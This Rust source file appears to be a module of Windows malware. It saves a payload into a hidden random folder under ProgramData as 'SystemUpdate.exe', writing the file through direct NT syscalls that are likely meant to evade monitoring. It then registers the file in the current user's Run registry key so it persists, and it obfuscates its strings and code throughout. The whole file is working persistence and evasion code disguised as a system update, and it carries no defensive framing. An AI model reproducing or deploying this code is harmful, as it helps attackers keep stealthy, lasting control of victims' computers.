use crate::syscalls;
use hex::ToHex;
use obfuscator::{obfuscate, obfuscate_string};
use rand::Rng;
use std::ffi::OsStr;
use std::fs;
use std::iter::once;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::path::Path;
use std::ptr;
use windows_sys::Win32::Foundation::HANDLE;
use windows_sys::Win32::Storage::FileSystem::{SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN};
use windows_sys::Win32::System::Registry::{
    RegCloseKey, RegOpenKeyExW, RegQueryValueExW, RegSetValueExW, HKEY_CURRENT_USER, KEY_READ,
    KEY_SET_VALUE, REG_SZ,
};

#[cfg(windows)]
const FILE_OVERWRITE_IF: u32 = 0x00000005;
#[cfg(windows)]
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
#[cfg(windows)]
const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
#[cfg(windows)]
const GENERIC_WRITE: u32 = 0x40000000;
#[cfg(windows)]
const FILE_ATTRIBUTE_NORMAL: u32 = 0x00000080;

#[cfg(windows)]
#[obfuscate(garbage = true)]
unsafe fn add_to_startup(file_path: &str) -> Result<(), String> {
    let run_key_path: Vec<u16> = OsStr::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
        .encode_wide()
        .chain(once(0))
        .collect();
    let app_name: Vec<u16> = OsStr::new("SystemUpdate")
        .encode_wide()
        .chain(once(0))
        .collect();

    // Check if the startup entry already exists and points to a valid file
    let mut hkey_read = mem::MaybeUninit::uninit();
    if RegOpenKeyExW(
        HKEY_CURRENT_USER,
        run_key_path.as_ptr(),
        0,
        KEY_READ,
        hkey_read.as_mut_ptr(),
    ) == 0
    {
        let hkey_read = hkey_read.assume_init();
        let mut data_type = mem::MaybeUninit::uninit();
        let mut data_size = 0;

        // First, query the size of the data
        if RegQueryValueExW(
            hkey_read,
            app_name.as_ptr(),
            ptr::null_mut(),
            data_type.as_mut_ptr(),
            ptr::null_mut(),
            &mut data_size,
        ) == 0
        {
            if *data_type.assume_init() == REG_SZ {
                let mut data_buffer: Vec<u16> = vec![0; (data_size / 2) as usize];
                if RegQueryValueExW(
                    hkey_read,
                    app_name.as_ptr(),
                    ptr::null_mut(),
                    ptr::null_mut(),
                    data_buffer.as_mut_ptr() as *mut u8,
                    &mut data_size,
                ) == 0
                {
                    // Null bytes might be included, so we need to handle that.
                    let end = data_buffer
                        .iter()
                        .position(|&x| x == 0)
                        .unwrap_or(data_buffer.len());
                    let path_str = String::from_utf16_lossy(&data_buffer[..end]);
                    if Path::new(&path_str).exists() {
                        RegCloseKey(hkey_read);
                        // The registry key exists and points to a valid file, so we're done.
                        return Ok(());
                    }
                }
            }
        }
        RegCloseKey(hkey_read);
    }

    // If the check fails or the key doesn't exist, proceed to create it.
    let mut hkey = mem::MaybeUninit::uninit();

    if RegOpenKeyExW(
        HKEY_CURRENT_USER,
        run_key_path.as_ptr(),
        0,
        KEY_SET_VALUE,
        hkey.as_mut_ptr(),
    ) != 0
    {
        return Err(obfuscate_string!("Failed to open registry key.").to_string());
    }

    let hkey = hkey.assume_init();
    let file_path_w: Vec<u16> = OsStr::new(file_path)
        .encode_wide()
        .chain(once(0))
        .collect();

    if RegSetValueExW(
        hkey,
        app_name.as_ptr(),
        0,
        REG_SZ,
        file_path_w.as_ptr() as *const u8,
        (file_path_w.len() * 2) as u32,
    ) != 0
    {
        RegCloseKey(hkey);
        return Err(obfuscate_string!("Failed to set registry value.").to_string());
    }

    RegCloseKey(hkey);
    Ok(())
}

#[cfg(windows)]
#[obfuscate(garbage = true)]
pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), String> {
    let mut program_data = match std::env::var(obfuscate_string!("ProgramData")) {
        Ok(s) => s,
        Err(_) => {
            return Err(obfuscate_string!("ProgramData environment variable not found.").to_string())
        }
    };

    if program_data.ends_with('\\') && program_data.len() > 3 {
        program_data.pop();
    }

    let mut rng = rand::thread_rng();
    let random_bytes: Vec<u8> = (0..6).map(|_| rng.gen::<u8>()).collect();
    let dir_name: String = random_bytes.encode_hex();

    let folder_path = format!("{}\\{}", program_data, dir_name);
    let full_file_path_win = format!("{}\\SystemUpdate.exe", folder_path);

    if let Err(e) = fs::create_dir_all(&folder_path) {
        return Err(format!(
            "{}{}",
            obfuscate_string!("Failed to create persistence directory: "),
            e
        ));
    }

    let folder_path_w: Vec<u16> = folder_path.encode_utf16().chain(Some(0)).collect();
    SetFileAttributesW(folder_path_w.as_ptr(), FILE_ATTRIBUTE_HIDDEN);

    let nt_path = format!("\\??\\{}", full_file_path_win);

    let mut wide_path: Vec<u16> = nt_path.encode_utf16().collect();

    let len_bytes = (wide_path.len() * 2) as u16;
    let max_len_bytes = ((wide_path.len() + 1) * 2) as u16;

    let mut unicode_string_path = syscalls::UNICODE_STRING {
        Length: len_bytes,
        MaximumLength: max_len_bytes,
        Buffer: wide_path.as_mut_ptr(),
    };

    let mut file_handle: HANDLE = ptr::null_mut();
    let mut io_status_block = syscalls::IO_STATUS_BLOCK {
        status: 0,
        information: 0,
    };

    let mut obj_attributes = syscalls::OBJECT_ATTRIBUTES {
        Length: mem::size_of::<syscalls::OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: ptr::null_mut(),
        ObjectName: &mut unicode_string_path,
        Attributes: 0x00000040,
        SecurityDescriptor: ptr::null_mut(),
        SecurityQualityOfService: ptr::null_mut(),
    };

    let status = (syscalls::SYSCALLS.NtCreateFile)(
        &mut file_handle,
        GENERIC_WRITE | 0x00100000,
        &mut obj_attributes,
        &mut io_status_block,
        ptr::null_mut(),
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        ptr::null_mut(),
        0,
    );

    if status != 0 {
        return Err(format!(
            "{}{:X}",
            obfuscate_string!("NtCreateFile failed with status: "),
            status
        ));
    }

    let write_status = (syscalls::SYSCALLS.NtWriteFile)(
        file_handle,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        &mut io_status_block,
        payload_data.as_ptr() as *mut std::ffi::c_void,
        payload_data.len() as u32,
        ptr::null_mut(),
        ptr::null_mut(),
    );

    let mut result: Result<(), String> = Ok(());

    if write_status != 0 {
        result = Err(format!(
            "{}{:X}",
            obfuscate_string!("NtWriteFile failed with status: "),
            write_status
        ));
    } else if io_status_block.information != payload_data.len() {
        result = Err(obfuscate_string!("NtWriteFile wrote incomplete data.").to_string());
    }

    (syscalls::SYSCALLS.NtClose)(file_handle as *mut _);

    if result.is_ok() {
        if let Err(e) = add_to_startup(&full_file_path_win) {
            return Err(format!(
                "{}{}",
                obfuscate_string!("Failed to add to startup: "),
                e
            ));
        }
    }

    result
}
